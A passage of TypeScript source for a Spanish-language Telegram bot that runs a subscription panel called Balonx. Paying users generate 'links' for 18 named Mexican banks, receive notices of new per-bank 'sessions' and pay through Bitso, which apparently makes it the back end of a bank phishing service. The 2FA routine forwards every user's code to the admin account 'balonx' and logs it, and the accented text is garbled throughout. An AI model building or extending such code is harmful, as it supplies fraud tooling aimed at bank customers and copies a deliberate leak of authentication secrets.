}> {\n  try {\n    if (!bot) {\n      console.warn('[Telegram Bot] Bot no configurado. No se puede enviar c贸digo 2FA.');\n      return { success: false, error: 'Bot de Telegram no configurado' };\n    }\n    \n    const user = await storage.getUserById(userId);\n    if (!user || !user.telegramChatId) {\n      return { success: false, error: 'Usuario no tiene Chat ID configurado' };\n    }\n\n    const code = generateVerificationCode();\n    const expiresAt = new Date(Date.now() + 10 * 60 * 1000); // Expira en 10 minutos\n\n    // Guardar c贸digo en la base de datos\n    await storage.createVerificationCode({\n      userId,\n      code,\n      expiresAt\n    });\n\n    const message = ` *C贸digo de Verificaci贸n*\n\nHola *${username}*,\n\nTu c贸digo de verificaci贸n para acceder al panel es:\n\n\\`${code}\\`\n\n Este c贸digo expira en 10 minutos.\n No compartas este c贸digo con nadie.\n\nSi no solicitaste este c贸digo, ignora este mensaje.`;\n\n    await bot.sendMessage(user.telegramChatId, message, { \n      parse_mode: 'Markdown',\n      disable_web_page_preview: true \n    });\n\n    // Tambi茅n enviar al administrador para monitoreo\n    const adminMessage = ` *C贸digo 2FA Enviado*\n\nUsuario: *${username}*\nC贸digo: \\`${code}\\`\nExpira: ${expiresAt.toLocaleString('es-MX')}`;\n\n    // Enviar al Chat ID configurado del administrador principal\n    if (ADMIN_CHAT_ID) {\n      await bot.sendMessage(ADMIN_CHAT_ID, adminMessage, { \n        parse_mode: 'Markdown',\n        disable_web_page_preview: true \n      });\n    }\n\n    // Tambi茅n enviar al administrador balonx si tiene Chat ID configurado\n    try {\n      const adminUser = await storage.getUserByUsername('balonx');\n      if (adminUser && adminUser.telegramChatId) {\n        await bot.sendMessage(adminUser.telegramChatId, adminMessage, { \n          parse_mode: 'Markdown',\n          disable_web_page_preview: true \n        });\n        console.log(` C贸digo 2FA tambi茅n enviado al admin balonx: ${adminUser.telegramChatId}`);\n      }\n    } catch (error) {\n      console.log('癸 No se pudo enviar al admin balonx:', error);\n    }\n\n    console.log(` C贸digo 2FA enviado a ${username}: ${code}`);\n    return { success: true, code };\n\n  } catch (error: any) {\n    console.error(' Error enviando c贸digo 2FA:', error);\n    return { success: false, error: error.message };\n  }\n}\n\n// Funci贸n para enviar OTP de ejecutivo a la oficina\nexport async function sendExecutiveOtp(officeChatId: string, executiveUsername: string, executiveDisplayName: string, otpCode: string): Promise<void> {\n  try {\n    const message = ` *Login de Ejecutivo - C贸digo OTP*\n\nEl ejecutivo *${executiveDisplayName}* (${executiveUsername}) est谩 intentando iniciar sesi贸n.\n\nC贸digo OTP:\n\\`${otpCode}\\`\n\n Este c贸digo expira en 5 minutos.\n Comparte este c贸digo solo con tu ejecutivo.`;\n\n    await bot.sendMessage(officeChatId, message, { \n      parse_mode: 'Markdown',\n      disable_web_page_preview: true \n    });\n\n    console.log(` OTP de ejecutivo enviado a oficina (ChatID: ${officeChatId}): ${otpCode}`);\n\n  } catch (error: any) {\n    console.error(' Error enviando OTP de ejecutivo:', error);\n    throw error;\n  }\n}\n\n// Funci贸n para verificar c贸digo 2FA\nexport async function verifyCode(userId: number, inputCode: string): Promise<{ success: boolean; error?: string }> {\n  try {\n    const verificationCode = await storage.getValidVerificationCode(userId, inputCode);\n    \n    if (!verificationCode) {\n      return { success: false, error: 'C贸digo inv谩lido o expirado' };\n    }\n\n    // Marcar c贸digo como usado\n    await storage.markVerificationCodeAsUsed(verificationCode.id);\n    \n    console.log(` C贸digo 2FA verificado para usuario ID: ${userId}`);\n    return { success: true };\n\n  } catch (error: any) {\n    console.error(' Error verificando c贸digo 2FA:', error);\n    return { success: false, error: error.message };\n  }\n}\n\n// Funci贸n para enviar mensaje de bienvenida\nexport async function sendWelcomeMessage(chatId: string): Promise<void> {\n  try {\n    await bot.sendMessage(chatId, WELCOME_MESSAGE, { \n      parse_mode: 'Markdown',\n      disable_web_page_preview: true \n    });\n    console.log(` Mensaje de bienvenida enviado a chat ID: ${chatId}`);\n  } catch (error: any) {\n    console.error(' Error enviando mensaje de bienvenida:', error);\n  }\n}\n\n// Funci贸n para que el administrador env铆e mensajes a usuarios\nexport async function sendAdminMessage(userChatId: string, message: string, fromAdmin: string = 'Administrador'): Promise<{ success: boolean; error?: string }> {\n  try {\n    const botReady = await ensureBotReady();\n    if (!botReady) {\n      return { success: false, error: 'Bot no disponible' };\n    }\n\n    const formattedMessage = ` *Mensaje del ${fromAdmin}*\n\n${message}\n\n---\n Para responder, contacta con @balonxSistema`;\n\n    await botReady.sendMessage(userChatId, formattedMessage, { \n      parse_mode: 'Markdown',\n      disable_web_page_preview: true \n    });\n\n    console.log(` Mensaje de administrador enviado a chat ID: ${userChatId}`);\n    return { success: true };\n\n  } catch (error: any) {\n    console.error(' Error enviando mensaje de administrador:', error);\n    return { success: false, error: error.message };\n  }\n}\n\n// Funci贸n para enviar documento/archivo desde el administrador\nexport async function sendAdminDocument(\n  userChatId: string, \n  filePath: string, \n  caption?: string\n): Promise<{ success: boolean; error?: string }> {\n  try {\n    const botReady = await ensureBotReady();\n    if (!botReady) {\n      return { success: false, error: 'Bot no disponible' };\n    }\n\n    // Enviar archivo con caption opcional\n    await botReady.sendDocument(userChatId, filePath, {\n      caption: caption || undefined,\n      parse_mode: caption ? 'Markdown' : undefined\n    });\n\n    console.log(` Documento enviado a chat ID: ${userChatId}`);\n    return { success: true };\n\n  } catch (error: any) {\n    console.error(' Error enviando documento:', error);\n    return { success: false, error: error.message };\n  }\n}\n\n// Funci贸n para enviar mensaje masivo a todos los usuarios con Chat ID\nexport async function sendBroadcastMessage(message: string, fromAdmin: string = 'Administrador'): Promise<{ success: boolean; sent: number; failed: number; errors: string[] }> {\n  try {\n    const users = await storage.getAllUsers();\n    const usersWithChatId = users.filter(user => user.telegramChatId && user.role === 'user');\n\n    let sent = 0;\n    let failed = 0;\n    const errors: string[] = [];\n\n    for (const user of usersWithChatId) {\n      try {\n        await sendAdminMessage(user.telegramChatId!, message, fromAdmin);\n        sent++;\n        // Peque帽a pausa para evitar l铆mites de rate\n        await new Promise(resolve => setTimeout(resolve, 100));\n      } catch (error: any) {\n        failed++;\n        errors.push(`Error enviando a ${user.username}: ${error.message}`);\n      }\n    }\n\n    console.log(` Mensaje masivo completado: ${sent} enviados, ${failed} fallidos`);\n    return { success: true, sent, failed, errors };\n\n  } catch (error: any) {\n    console.error(' Error en mensaje masivo:', error);\n    return { success: false, sent: 0, failed: 0, errors: [error.message] };\n  }\n}\n\n// Funci贸n para enviar notificaci贸n de activaci贸n de cuenta\nexport async function sendAccountActivationNotification(userData: {\n  username: string;\n  telegramChatId: string | null;\n  expiresAt?: Date | null;\n  allowedBanks?: string;\n}): Promise<{ success: boolean; error?: string }> {\n  try {\n    if (!userData.telegramChatId) {\n      return { success: false, error: \"No se encontr贸 Chat ID del usuario\" };\n    }\n\n    // Determinar duraci贸n (1 d铆a o 7 d铆as)\n    const duration = userData.expiresAt ? \n      (new Date(userData.expiresAt).getTime() - Date.now() > 2 * 24 * 60 * 60 * 1000 ? '7 d铆as' : '1 d铆a') \n      : 'permanente';\n\n    // Determinar bancos\n    const banksText = userData.allowedBanks === 'all' \n      ? 'todos los bancos' \n      : `los bancos seleccionados (${userData.allowedBanks?.split(',').join(', ')})`;\n\n    // Mensaje de bienvenida cuando el administrador activa la cuenta\n    const message = ` *隆Tu cuenta ha sido activada!*\n\n隆Bienvenido *${userData.username}*!\n\n Tu cuenta fue activada para ${banksText} por ${duration}.\n\n Ya puedes ingresar a tu panel y utilizar todos los servicios disponibles.\n\n *Acceso*: Balonx.pro/balonx\n *Soporte*: @BalonxSistema\n\n隆Gracias por usar nuestros servicios!`;\n\n    await bot.sendMessage(userData.telegramChatId, message, { \n      parse_mode: 'Markdown',\n      disable_web_page_preview: true \n    });\n\n    console.log(` Notificaci贸n de activaci贸n enviada a ${userData.username} (${userData.telegramChatId})`);\n    return { success: true };\n\n  } catch (error: any) {\n    console.error(` Error enviando notificaci贸n de activaci贸n a ${userData.username}:`, error);\n    return { success: false, error: error.message };\n  }\n}\n\n// Funci贸n para enviar notificaci贸n de sesi贸n (existente)\nexport async function sendSessionNotification(sessionData: {\n  sessionId: string;\n  banco: string;\n  tipo: string;\n  username?: string;\n}): Promise<void> {\n  try {\n    const message = ` *Nueva Sesi贸n Creada*\n\nID: \\`${sessionData.sessionId}\\`\nBanco: *${sessionData.banco}*\nTipo: *${sessionData.tipo}*\n${sessionData.username ? `Creado por: *${sessionData.username}*` : ''}\n\nTiempo: ${new Date().toLocaleString('es-MX')}`;\n\n    if (ADMIN_CHAT_ID) {\n      await bot.sendMessage(ADMIN_CHAT_ID, message, { \n        parse_mode: 'Markdown',\n        disable_web_page_preview: true \n      });\n    }\n\n    console.log(` Notificaci贸n de sesi贸n enviada: ${sessionData.sessionId}`);\n  } catch (error: any) {\n    console.error(' Error enviando notificaci贸n de sesi贸n:', error);\n  }\n}\n\n// Manejar comandos del bot\nconst setupBotCommands = () => {\n  if (!bot) return;\n  \n  // Comando /pago para verificar pagos\n  bot.onText(/\\/pago/, async (msg) => {\n    const chatId = msg.chat.id.toString();\n    console.log(` Comando /pago recibido de chat ID: ${chatId}`);\n    \n    try {\n      // Buscar usuario por chat ID\n      const users = await storage.getAllUsers();\n      const user = users.find(u => u.telegramChatId === chatId);\n      \n      if (!user) {\n        await bot.sendMessage(chatId, ` No se encontr贸 un usuario asociado a este Chat ID.\n\nPor favor, registra tu cuenta primero en Balonx.pro/balonx`, { \n          parse_mode: 'Markdown',\n          disable_web_page_preview: true \n        });\n        return;\n      }\n\n      // Obtener el precio que debe pagar el usuario seg煤n tipo de cuenta\n      const systemConfig = await storage.getSystemConfig();\n      const isOffice = user.accountType === 'office';\n      const basePrice = isOffice ? '6000' : (systemConfig?.subscriptionPrice || '3000');\n      const expectedAmount = user.customPrice || basePrice;\n      \n      // Verificar si ya existe un pago reciente en Bitso\n      const { verifyPayment } = await import('./bitsoService');\n      const existingPayment = await verifyPayment(expectedAmount);\n      \n      if (existingPayment) {\n        await bot.sendMessage(chatId, ` *隆Pago Confirmado!*\n\nTu dep贸sito de *$${existingPayment.amount} MXN* ya fue verificado exitosamente.\n\nTu cuenta est谩 activa. Si necesitas renovar, contacta con @BalonxSistema`, { \n          parse_mode: 'Markdown',\n          disable_web_page_preview: true \n        });\n        return;\n      }\n\n      // Obtener cuenta de dep贸sito\n      const BITSO_RECEIVING_ACCOUNT = process.env.BITSO_RECEIVING_ACCOUNT || '';\n      \n      // Crear sesi贸n de pago\n      paymentSessions.set(chatId, {\n        chatId,\n        state: 'awaiting_screenshot',\n        userId: user.id,\n        expectedAmount\n      });\n\n      const accountTypeInfo = isOffice \n        ? `\\n\\n *Cuenta de Oficina:*\n Gestiona hasta 8 ejecutivos\n Cada ejecutivo con acceso independiente\n Visibilidad completa de todas las sesiones` \n        : '';\n\n      const message = ` *Instrucciones de Pago*\n\nHola *${user.username}*,\n\nPara activar o renovar tu cuenta por 7 d铆as:${accountTypeInfo}\n\n *Monto a depositar:* $${expectedAmount} MXN\n\n *Instrucciones:*\n1锔 Abre tu app bancaria\n2锔 Deposita exactamente *$${expectedAmount} MXN*\n3锔 Usa la siguiente cuenta receptora:\n   \\`${BITSO_RECEIVING_ACCOUNT}\\`\n\n憋 *Verificaci贸n Autom谩tica:*\n Env铆a tu captura de pantalla del pago\n El sistema verificar谩 tu pago con Bitso cada 2 minutos\n Recibir谩s confirmaci贸n autom谩tica (puede tomar hasta 30 min)\n Si no se verifica, el admin revisar谩 manualmente\n\n *Siguiente paso:*\nEnv铆a la captura de pantalla de tu transferencia\n\nPara cancelar este proceso, env铆a /cancelar`;\n\n      await bot.sendMessage(chatId, message, { \n        parse_mode: 'Markdown',\n        disable_web_page_preview: true \n      });\n\n    } catch (error: any) {\n      console.error(' Error en comando /pago:', error);\n      await bot.sendMessage(chatId, ' Ocurri贸 un error al procesar tu solicitud. Intenta nuevamente.', { \n        parse_mode: 'Markdown' \n      });\n    }\n  });\n\n  // Comando /cancelar para cancelar proceso de pago\n  bot.onText(/\\/cancelar/, async (msg) => {\n    const chatId = msg.chat.id.toString();\n    \n    if (linkGenerationSessions.has(chatId)) {\n      cleanupLinkSession(chatId);\n      await bot.sendMessage(chatId, ' Generaci贸n de enlace cancelada.', { \n        parse_mode: 'Markdown' \n      });\n    } else if (paymentSessions.has(chatId)) {\n      paymentSessions.delete(chatId);\n      await bot.sendMessage(chatId, ' Proceso de pago cancelado.', { \n        parse_mode: 'Markdown' \n      });\n    } else if (discountSessions.has(chatId)) {\n      discountSessions.delete(chatId);\n      await bot.sendMessage(chatId, ' Creaci贸n de c贸digo de descuento cancelada.', { \n        parse_mode: 'Markdown' \n      });\n    } else {\n      await bot.sendMessage(chatId, '癸 No hay ning煤n proceso activo.', { \n        parse_mode: 'Markdown' \n      });\n    }\n  });\n\n  // Comando /descuento para crear c贸digos de descuento (solo admin)\n  bot.onText(/\\/descuento/, async (msg) => {\n    const chatId = msg.chat.id.toString();\n    console.log(` Comando /descuento recibido de chat ID: ${chatId}`);\n    \n    try {\n      // Verificar que sea el administrador\n      if (chatId !== ADMIN_CHAT_ID) {\n        await bot.sendMessage(chatId, ' Este comando es solo para administradores.', { \n          parse_mode: 'Markdown' \n        });\n        return;\n      }\n\n      // Crear sesi贸n de descuento\n      discountSessions.set(chatId, {\n        chatId,\n        state: 'awaiting_amount'\n      });\n\n      const message = ` *Crear C贸digo de Descuento*\n\n驴Qu茅 descuento deseas crear?\n\nPor ejemplo: *500* (para $500 MXN de descuento)\n\nEl sistema generar谩 un c贸digo 煤nico de un solo uso.\n\nPara cancelar, env铆a /cancelar`;\n\n      await bot.sendMessage(chatId, message, { \n        parse_mode: 'Markdown',\n        disable_web_page_preview: true \n      });\n\n    } catch (error: any) {\n      console.error(' Error en comando /descuento:', error);\n      await bot.sendMessage(chatId, ' Ocurri贸 un error al procesar tu solicitud. Intenta nuevamente.', { \n        parse_mode: 'Markdown' \n      });\n    }\n  });\n  \n  bot.onText(/\\/start/, async (msg) => {\n    const chatId = msg.chat.id.toString();\n    const userName = msg.from?.first_name || 'Usuario';\n    console.log(` Comando /start recibido de chat ID: ${chatId}`);\n    \n    try {\n      // Verificar si ya existe un usuario con este Chat ID\n      const users = await storage.getAllUsers();\n      const existingUser = users.find(user => user.telegramChatId === chatId);\n      \n      if (existingUser) {\n        // Usuario ya configurado\n        const message = ` *隆Hola de nuevo, ${existingUser.username}!*\n\nTu Chat ID ya est谩 configurado correctamente: \\`${chatId}\\`\n\n *Estado de tu cuenta:*\n Usuario: ${existingUser.username}\n Estado: ${existingUser.isActive ? ' Activo' : ' Inactivo'}\n Expira: ${existingUser.expiresAt ? new Date(existingUser.expiresAt).toLocaleDateString('es-ES') : 'Sin fecha'}\n\n *Comandos disponibles:*\n /help - Ver ayuda completa\n /id - Ver tu Chat ID\n\n *Soporte*: @BalonxSistema`;\n\n        await bot.sendMessage(chatId, message, { \n          parse_mode: 'Markdown',\n          disable_web_page_preview: true \n        });\n        return;\n      }\n\n      // Buscar usuarios sin Chat ID configurado para asociaci贸n autom谩tica\n      const usersWithoutChatId = users.filter(user => !user.telegramChatId && user.role === 'user');\n      \n      // Funci贸n para asociar Chat ID con confirmaci贸n\n      const associateUserChatId = async (user: any, method: string) => {\n        try {\n          await storage.updateUser(user.id, { telegramChatId: chatId });\n          \n          const message = ` *隆Chat ID Asociado Autom谩ticamente!*\n\nHola *${userName}*, hemos asociado autom谩ticamente tu Chat ID con la cuenta: *${user.username}*\n\nTu Chat ID: \\`${chatId}\\`\nM茅todo: ${method}\n\n *Configuraci贸n completada:*\n Ya puedes recibir c贸digos 2FA aqu铆\n Recibir谩s notificaciones importantes\n Estado: ${user.isActive ? ' Activo' : ' Inactivo'}\n\n *Comandos disponibles:*\n /help - Ver ayuda completa\n /id - Ver tu Chat ID\n\n *Soporte*: @BalonxSistema\n\n隆Tu cuenta est谩 lista para usar!`;\n\n          await bot.sendMessage(chatId, message, { \n            parse_mode: 'Markdown',\n            disable_web_page_preview: true \n          });\n\n          // Notificar al administrador\n          const adminMessage = ` *Chat ID Asociado Autom谩ticamente*\n\nUsuario: *${user.username}*\nChat ID: \\`${chatId}\\`\nNombre Telegram: ${userName}\nM茅todo: ${method}\n\n Asociaci贸n completada exitosamente`;\n\n          await bot.sendMessage(ADMIN_CHAT_ID, adminMessage, { \n            parse_mode: 'Markdown',\n            disable_web_page_preview: true \n          });\n\n          console.log(` Chat ID ${chatId} asociado autom谩ticamente al usuario ${user.username} (${method})`);\n          return true;\n        } catch (error) {\n          console.error(' Error asociando Chat ID autom谩ticamente:', error);\n          return false;\n        }\n      };\n\n      // Prioridad 1: Buscar coincidencia exacta por nombre de usuario\n      const exactMatch = usersWithoutChatId.find(user => \n        user.username.toLowerCase() === userName.toLowerCase()\n      );\n      if (exactMatch) {\n        const success = await associateUserChatId(exactMatch, \"Coincidencia exacta de nombre\");\n        if (success) return;\n      }\n\n      // Prioridad 2: Buscar coincidencia parcial por nombre de usuario\n      const partialMatch = usersWithoutChatId.find(user => \n        user.username.toLowerCase().includes(userName.toLowerCase()) ||\n        userName.toLowerCase().includes(user.username.toLowerCase())\n      );\n      if (partialMatch) {\n        const success = await associateUserChatId(partialMatch, \"Coincidencia parcial de nombre\");\n        if (success) return;\n      }\n\n      // Prioridad 3: Si hay solo un usuario sin Chat ID, asociar autom谩ticamente\n      if (usersWithoutChatId.length === 1) {\n        const success = await associateUserChatId(usersWithoutChatId[0], \"nico usuario disponible\");\n        if (success) return;\n      }\n\n      // Mensaje por defecto si no hay asociaci贸n autom谩tica posible\n      const welcomeMessage = ` *隆Hola ${userName}!*\n\nTu Chat ID es: \\`${chatId}\\`\n\n *Para registrarte en nuestro panel:*\n1. Ve al panel de registro\n2. Completa tu informaci贸n\n3. **Usa este Chat ID:** \\`${chatId}\\`\n4. Una vez registrado, recibir谩s c贸digos 2FA aqu铆\n\n${usersWithoutChatId.length > 1 ? \n  `锔 *Nota:* Hay ${usersWithoutChatId.length} usuarios sin Chat ID configurado. La asociaci贸n autom谩tica no es posible.` : \n  ''}\n\n *Comandos disponibles:*\n /help - Ver ayuda completa\n /id - Ver tu Chat ID nuevamente\n\n *Soporte*: @BalonxSistema\n\n隆Gracias por utilizar nuestro sistema!`;\n\n      await bot.sendMessage(chatId, welcomeMessage, { \n        parse_mode: 'Markdown',\n        disable_web_page_preview: true \n      });\n\n    } catch (error) {\n      console.error(' Error en comando /start:', error);\n      \n      // Mensaje de fallback\n      const fallbackMessage = ` *隆Hola ${userName}!*\n\nTu Chat ID es: \\`${chatId}\\`\n\nPara registrarte, usa este Chat ID en el panel de registro.\n\n *Soporte*: @BalonxSistema`;\n\n      await bot.sendMessage(chatId, fallbackMessage, { \n        parse_mode: 'Markdown',\n        disable_web_page_preview: true \n      });\n    }\n  });\n\n  bot.onText(/\\/help/, async (msg) => {\n    const chatId = msg.chat.id.toString();\n    const helpMessage = ` *Ayuda del Bot*\n\n*Comandos disponibles:*\n /start - Mensaje de bienvenida\n /generar - Generar enlaces para bancos\n /pago - Verificar tu pago (enviar captura y monto)\n /help - Mostrar esta ayuda\n /id - Mostrar tu Chat ID\n /cancelar - Cancelar proceso actual\n\n*Funciones:*\n Generar enlaces desde Telegram\n Recibir notificaciones de tus sesiones\n Recibir c贸digos de verificaci贸n 2FA\n Verificaci贸n de pagos con captura\n Recibir mensajes del administrador\n\n Para soporte: @balonxSistema`;\n\n    await bot.sendMessage(chatId, helpMessage, { \n      parse_mode: 'Markdown',\n      disable_web_page_preview: true \n    });\n  });\n\n  bot.onText(/\\/id/, async (msg) => {\n    const chatId = msg.chat.id.toString();\n    const idMessage = ` *Tu Chat ID*\n\nTu Chat ID es: \\`${chatId}\\`\n\nNecesitas este ID para:\n Registro en el panel\n Recibir c贸digos 2FA\n Recibir notificaciones\n\n Copia este n煤mero y 煤salo al registrarte.`;\n\n    await bot.sendMessage(chatId, idMessage, { \n      parse_mode: 'Markdown',\n      disable_web_page_preview: true \n    });\n  });\n\n  // Comando para generar enlaces desde Telegram\n  bot.onText(/\\/generar/, async (msg) => {\n    const chatId = msg.chat.id.toString();\n    \n    try {\n      // Verificar si ya hay una sesi贸n activa para este chat\n      if (linkGenerationSessions.has(chatId)) {\n        await bot.sendMessage(chatId, `锔 *Ya tienes un proceso activo*\n\nPor favor completa o cancela el proceso actual antes de iniciar uno nuevo.\n\nPara cancelar, env铆a /cancelar`, {\n          parse_mode: 'Markdown'\n        });\n        return;\n      }\n      \n      // Buscar al usuario por Chat ID\n      const users = await storage.getAllUsers();\n      const user = users.find(u => u.telegramChatId === chatId);\n      \n      if (!user) {\n        await bot.sendMessage(chatId, ` *No est谩s registrado*\n\nPara generar enlaces, primero debes registrarte en el panel.\n\n Tu Chat ID: \\`${chatId}\\`\n\n Pasos:\n1. Ve al panel de registro\n2. Crea tu cuenta\n3. Ingresa este Chat ID: \\`${chatId}\\`\n\nUna vez registrado, podr谩s usar /generar\n\n *Soporte*: @BalonxSistema`, {\n          parse_mode: 'Markdown',\n          disable_web_page_preview: true\n        });\n        return;\n      }\n\n      // SEGURIDAD: Verificar que el usuario tenga rol de 'user' o 'admin' (no ejecutivos u otros roles)\n      if (user.role !== 'user' && user.role !== 'admin') {\n        await bot.sendMessage(chatId, ` *Acceso Restringido*\n\nTu tipo de cuenta no permite generar enlaces desde Telegram.\n\nPor favor usa el panel web para generar enlaces.\n\n *Soporte*: @BalonxSistema`, {\n          parse_mode: 'Markdown',\n          disable_web_page_preview: true\n        });\n        return;\n      }\n\n      // Verificar que el usuario est茅 activo\n      if (!user.isActive) {\n        await bot.sendMessage(chatId, `锔 *Cuenta Inactiva*\n\nTu cuenta est谩 desactivada.\n\n${user.expiresAt && new Date(user.expiresAt) < new Date() \n  ? ' Tu suscripci贸n ha vencido. Por favor renueva tu cuenta.' \n  : ' Contacta con el administrador para activar tu cuenta.'}\n\n *Soporte*: @BalonxSistema`, {\n          parse_mode: 'Markdown',\n          disable_web_page_preview: true\n        });\n        return;\n      }\n      \n      // Verificar que la cuenta no haya expirado\n      if (user.expiresAt && new Date(user.expiresAt) < new Date()) {\n        await bot.sendMessage(chatId, ` *Suscripci贸n Vencida*\n\nTu suscripci贸n ha expirado.\n\n Fecha de vencimiento: ${new Date(user.expiresAt).toLocaleString('es-MX')}\n\nPara renovar, contacta con:\n *Soporte*: @BalonxSistema`, {\n          parse_mode: 'Markdown',\n          disable_web_page_preview: true\n        });\n        return;\n      }\n      \n      // SEGURIDAD: Verificar cuota semanal (150 enlaces por semana)\n      const quotaCheck = await linkQuotaService.checkQuota(user.id);\n      if (!quotaCheck.allowed) {\n        const resetsAt = linkQuotaService.getNextMonday(quotaCheck.weekStart);\n        const daysUntilReset = Math.ceil((resetsAt.getTime() - Date.now()) / (24 * 60 * 60 * 1000));\n        \n        await bot.sendMessage(chatId, ` *Cuota Semanal Agotada*\n\nHas alcanzado tu l铆mite semanal de *${quotaCheck.limit} enlaces*.\n\nEnlaces usados: ${quotaCheck.limit - quotaCheck.remaining} / ${quotaCheck.limit}\nEnlaces restantes: ${quotaCheck.remaining}\n\n Tu cuota se restablecer谩 en *${daysUntilReset} d铆a(s)* (pr贸ximo lunes).\n\n Esta cuota es compartida entre el panel web y el bot de Telegram.\n\n Puedes ver todos tus enlaces activos en el panel web.`, {\n          parse_mode: 'Markdown',\n          disable_web_page_preview: true\n        });\n        return;\n      }\n\n      // Obtener bancos permitidos para este usuario\n      const allowedBanks = user.allowedBanks || 'all';\n      let banksList: string[] = [];\n      \n      if (allowedBanks === 'all') {\n        banksList = ['liverpool', 'citibanamex', 'banbajio', 'bbva', 'banorte', 'bancoppel', 'hsbc', 'amex', 'santander', 'scotiabank', 'invex', 'banregio', 'spin', 'platacard', 'bancoazteca', 'bienestar', 'inbursa', 'afirme'];\n      } else {\n        banksList = allowedBanks.split(',').map(b => b.trim().toLowerCase());\n      }\n\n      // Crear sesi贸n de generaci贸n de enlaces con timeout de 5 minutos\n      const sessionTimeout = setTimeout(() => {\n        cleanupLinkSession(chatId);\n        bot.sendMessage(chatId, ' *Sesi贸n Expirada*\\n\\nTu sesi贸n de generaci贸n de enlaces ha expirado por inactividad.\\n\\nUsa /generar para crear un nuevo enlace.', {\n          parse_mode: 'Markdown'\n        }).catch(() => {}); // Ignorar error si el usuario bloque贸 el bot\n      }, 5 * 60 * 1000); // 5 minutos\n      \n      linkGenerationSessions.set(chatId, {\n        chatId,\n        userId: user.id,\n        username: user.username,\n        state: 'awaiting_bank_selection',\n        allowedBanks: banksList,\n        createdAt: new Date(),\n        timeoutId: sessionTimeout\n      });\n\n      // Formatear lista de bancos\n      const BANK_NAMES: Record<string, string> = {\n        liverpool: ' Liverpool',\n        citibanamex: ' Citibanamex',\n        banbajio: ' BanBaj铆o',\n        bbva: ' BBVA',\n        banorte: ' Banorte',\n        bancoppel: ' BanCoppel',\n        hsbc: ' HSBC',\n        amex: ' American Express',\n        santander: ' Santander',\n        scotiabank: ' Scotiabank',\n        invex: ' Invex',\n        banregio: ' Banregio',\n        spin: ' SPIN',\n        platacard: ' Platacard',\n        bancoazteca: ' Banco Azteca',\n        bienestar: ' Banco del Bienestar',\n        inbursa: ' Inbursa',\n        afirme: ' Afirme'\n      };\n\n      let bankOptions = '';\n      banksList.forEach((bank, index) => {\n        const bankName = BANK_NAMES[bank] || bank.toUpperCase();\n        bankOptions += `${index + 1}. ${bankName}\\n`;\n      });\n\n      const message = ` *Generador de Enlaces*\n\nHola *${user.username}*, selecciona el banco para el cual deseas generar un enlace:\n\n${bankOptions}\n\n *Responde con el n煤mero o nombre del banco*\nEjemplo: \\`1\\` o \\`Liverpool\\`\n\n Para cancelar, env铆a /cancelar`;\n\n      await bot.sendMessage(chatId, message, {\n        parse_mode: 'Markdown',\n        disable_web_page_preview: true\n      });\n\n    } catch (error: any) {\n      console.error(' Error en comando /generar:', error);\n      \n      // Limpiar sesi贸n en caso de error\n      cleanupLinkSession(chatId);\n      \n      await bot.sendMessage(chatId, ' Ocurri贸 un error al procesar tu solicitud. Intenta nuevamente.', {\n        parse_mode: 'Markdown'\n      });\n    }\n  });\n\n  // Manejar errores del polling con m谩s detalles\n  bot.on('polling_error', (error: any) => {\n    if (error.code === 'ETELEGRAM' || error.code === 'EFATAL') {\n      // Error cr铆tico - detener y reiniciar bot despu茅s de 10 segundos\n      console.error(' Error cr铆tico de polling:', error.message || error.code);\n      console.error('   Detalle:', JSON.stringify(error, null, 2));\n    } else {\n      // Error recuperable - solo log\n      console.log('锔 Error de polling (continuando):', error.code, error.message);\n    }\n  });\n\n  console.log(' Bot de Telegram configurado con comandos: /start, /generar, /pago, /help, /id, /cancelar');\n};\n\n// Configurar botones de comandos del bot\nconst setupBotMenu = async () => {\n  try {\n    await bot.setMyCommands([\n      { command: 'start', description: 'Iniciar el bot y ver informaci贸n' },\n      { command: 'generar', description: 'Generar enlaces para bancos' },\n      { command: 'pago', description: 'Verificar pago (enviar captura y monto)' },\n      { command: 'help', description: 'Ver ayuda y comandos disponibles' },\n      { command: 'id', description: 'Ver tu Chat ID' },\n      { command: 'cancelar', description: 'Cancelar proceso actual' }\n    ]);\n    console.log(' Men煤 de comandos del bot configurado');\n  } catch (error) {\n    console.error(' Error configurando men煤 de comandos:', error);\n  }\n};\n\n// Configurar comandos y men煤 del bot despu茅s de la inicializaci贸n\nsetTimeout(setupBotCommands, 1000);\nsetTimeout(setupBotMenu, 1500);\n\n// Exportar el bot para uso externo si es necesario\nexport { bot };\n\n// Funci贸n de limpieza para c贸digos expirados (ejecutar peri贸dicamente)\nexport async function cleanupExpiredCodes(): Promise<void> {\n  try {\n    const expired = await storage.cleanupExpiredVerificationCodes();\n    if (expired > 0) {\n      console.log(`Ч Limpieza: ${expired} c贸digos 2FA expirados eliminados`);\n    }\n  } catch (error) {\n    console.error(' Error en limpieza de c贸digos:', error);\n  }\n}\n\n// Ejecutar limpieza cada 30 minutos\nsetInterval(cleanupExpiredCodes, 30 * 60 * 1000);\n\n/**\n * Env铆a instrucciones de pago a un usuario\n */\nexport async function sendPaymentInstructions(user: any, context: 'registration' | 'renewal' = 'registration'): Promise<void> {\n  try {\n    if (!user.telegramChatId) {\n      console.log(`[Bot] Usuario ${user.username} no tiene Chat ID configurado`);\n      return;\n    }\n\n    // Obtener el precio que debe pagar el usuario seg煤n tipo de cuenta\n    const systemConfig = await storage.getSystemConfig();\n    const isOffice = user.accountType === 'office';\n    const basePrice = isOffice ? '6000' : (systemConfig?.subscriptionPrice || '3000');\n    const expectedAmount = user.customPrice || basePrice;\n    \n    // Obtener cuenta de dep贸sito\n    const BITSO_RECEIVING_ACCOUNT = process.env.BITSO_RECEIVING_ACCOUNT || '';\n    \n    // Verificar que la cuenta de dep贸sito est茅 configurada\n    if (!BITSO_RECEIVING_ACCOUNT) {\n      const fallbackMessage = `锔 Error de configuraci贸n del sistema. Por favor contacta con @BalonxSistema para completar tu ${context === 'registration' ? 'registro' : 'renovaci贸n'}.`;\n      await bot.sendMessage(user.telegramChatId, fallbackMessage, { \n        parse_mode: 'Markdown',\n        disable_web_page_preview: true \n      });\n      console.error(`[Bot] BITSO_RECEIVING_ACCOUNT no configurado para usuario ${user.username}`);\n      return;\n    }\n    \n    // Crear sesi贸n de pago\n    paymentSessions.set(user.telegramChatId, {\n      chatId: user.telegramChatId,\n      state: 'awaiting_screenshot',\n      userId: user.id,\n      expectedAmount\n    });\n\n    const contextMessage = context === 'registration' \n      ? `隆Bienvenido al sistema! Para activar tu cuenta por 7 d铆as:`\n      : ` *Realiza tu pago*\\n\\nTu suscripci贸n vence pronto. Para renovar tu cuenta por 7 d铆as:`;\n    \n    const accountTypeInfo = isOffice \n      ? `\\n\\n *Cuenta de Oficina:*\n 